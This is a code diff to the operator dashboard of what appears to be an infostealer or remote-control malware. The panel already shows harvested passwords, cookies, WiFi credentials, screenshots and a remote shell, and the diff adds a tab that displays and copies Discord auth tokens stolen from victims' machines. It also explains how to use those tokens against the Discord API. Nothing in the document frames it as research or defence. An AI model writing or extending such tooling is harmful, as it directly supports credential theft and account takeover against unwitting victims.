@@ -97,6 +97,7 @@
       <button class="tab-btn" onclick="switchTab('passwords', this)">Passwords</button>
       <button class="tab-btn" onclick="switchTab('cookies', this)">Cookies</button>
       <button class="tab-btn" onclick="switchTab('wifi', this)">WiFi</button>
+      <button class="tab-btn" onclick="switchTab('discord', this)">Discord</button>
     </div>
 
     <main id="tabActivity" class="tab-content active border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl">
@@ -253,6 +254,26 @@
           </thead>
           <tbody id="wifiBody" class="text-sm divide-y divide-slate-800/50">
             <tr><td class="py-8 px-4 text-center text-slate-500" colspan="6">No WiFi credentials harvested yet</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
+
+    <main id="tabDiscord" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
+      <h2 class="text-lg font-semibold text-slate-300 mb-4">Discord Tokens</h2>
+      <p class="text-xs text-slate-500 mb-4">Auth tokens extracted from Discord clients. Use <code class="text-emerald-400 bg-slate-800 px-1 rounded">Authorization: Bearer &lt;token&gt;</code> with the <a class="text-emerald-400 hover:underline" href="https://discord.com/developers/docs/reference" target="_blank">Discord REST API</a>.</p>
+      <div class="overflow-x-auto">
+        <table class="w-full text-left border-collapse">
+          <thead>
+            <tr class="bg-slate-900/80 border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
+              <th class="py-3 px-4 w-52">Time</th>
+              <th class="py-3 px-4 w-36">Host</th>
+              <th class="py-3 px-4">Token</th>
+              <th class="py-3 px-4 w-24">Action</th>
+            </tr>
+          </thead>
+          <tbody id="discordBody" class="text-sm divide-y divide-slate-800/50">
+            <tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">No Discord tokens found yet<br><span class="text-xs text-slate-600">Agent will check on startup and every 5 minutes</span></td></tr>
           </tbody>
         </table>
       </div>
@@ -557,12 +578,14 @@ function switchTab(tab, btn) {
   document.getElementById('tabPasswords').classList.toggle('active', tab === 'passwords');
   document.getElementById('tabCookies').classList.toggle('active', tab === 'cookies');
   document.getElementById('tabWiFi').classList.toggle('active', tab === 'wifi');
+  document.getElementById('tabDiscord').classList.toggle('active', tab === 'discord');
   if (tab === 'screenshots') fetchScreenshots();
   if (tab === 'triggers') fetchTriggers();
   if (tab === 'shell') fetchExecResults();
   if (tab === 'passwords') fetchPasswords();
   if (tab === 'cookies') fetchCookies();
   if (tab === 'wifi') fetchWiFi();
+  if (tab === 'discord') fetchDiscordTokens();
 }
 
 async function fetchLatestVersion() {
@@ -902,6 +925,31 @@ async function fetchWiFi() {
   } catch (e) {}
 }
 
+async function fetchDiscordTokens() {
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/discord_tokens?select=id,created_at,hostname,token&order=created_at.desc&limit=50'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const tbody = document.getElementById('discordBody');
+    if (!data || data.length === 0) {
+      tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">No Discord tokens found yet<br><span class="text-xs text-slate-600">Agent will check on startup and every 5 minutes</span></td></tr>';
+      return;
+    }
+    tbody.innerHTML = data.map(row => {
+      const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
+      const host = row.hostname || '-';
+      const token = row.token || '';
+      const masked = token.length > 20 ? token.substring(0, 10) + '&#8226;'.repeat(20) + token.substring(token.length - 5) : '&#8226;'.repeat(20);
+      return '<tr class="hover:bg-slate-800/30 transition-colors">'
+        + '<td class="py-3 px-4 text-slate-400 whitespace-nowrap text-xs">' + ts + '</td>'
+        + '<td class="py-3 px-4 text-emerald-400 font-medium text-xs">' + escapeHtml(displayHost(host)) + '</td>'
+        + '<td class="py-3 px-4 text-xs mono-log break-all"><span class="token-mask cursor-pointer text-slate-400 hover:text-slate-200" onclick="this.textContent = this.dataset.token" data-token="' + escapeHtml(token) + '" title="Click to reveal">' + masked + '</span></td>'
+        + '<td class="py-3 px-4 text-xs"><button class="px-2 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 transition" onclick="navigator.clipboard.writeText(\'' + token.replace(/'/g, "\\'") + '\').then(()=>{this.textContent=\'Copied!\';setTimeout(()=>{this.textContent=\'Copy\'},1500)})">Copy</button></td>'
+        + '</tr>';
+    }).join('');
+  } catch (e) {}
+}
+
 document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
@@ -930,6 +978,7 @@ window.addEventListener('DOMContentLoaded', () => {
     else if (currentTab === 'passwords') fetchPasswords();
     else if (currentTab === 'cookies') fetchCookies();
     else if (currentTab === 'wifi') fetchWiFi();
+    else if (currentTab === 'discord') fetchDiscordTokens();
   }, 20000);
   setInterval(tick, 1000);
 });
